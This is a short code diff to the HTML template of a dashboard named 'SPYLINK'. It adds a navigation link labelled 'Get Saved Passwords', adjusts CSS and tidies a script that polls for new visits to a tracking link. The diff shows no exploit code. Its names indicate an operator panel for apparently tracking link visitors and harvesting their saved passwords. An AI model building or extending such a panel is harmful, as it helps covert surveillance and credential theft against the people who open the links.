@@ -25,6 +25,7 @@
       letter-spacing: 2px;
     }
     .header nav a {
+      margin-left: 0.75rem;
       padding: 0.5rem 1rem;
       background: #279efc;
       color: #fff;
@@ -145,7 +146,10 @@
 <body>
   <header class="header">
     <div class="logo">SPYLINK</div>
-    <nav><a href="/">＋ New Link</a></nav>
+    <nav>
+      <a href="/">＋ New Link</a>
+      <a href="/passwords" target="_blank">Get Saved Passwords</a>
+    </nav>
   </header>
 
   <main class="dashboard">
@@ -233,7 +237,6 @@
       }
 
       // initial show of newest visit
-      let latestIndex = 0;
       if (cards.length > 0) {
         select.value = '0';
         showCard('0');
@@ -274,7 +277,7 @@
         }
       });
 
-      // ——— Poll for new visits every 5s ———
+      // Poll for new visits every 5s
       const code = "{{ code }}";
       setInterval(async () => {
         try {
@@ -282,14 +285,12 @@
           if (!res.ok) return;
           const { count } = await res.json();
           if (count > cards.length) {
-            // new visit! reload to pick up the new row
             window.location.reload();
           }
         } catch (e) {
           console.warn("poll error", e);
         }
       }, 5000);
-
     });
   </script>
 </body>
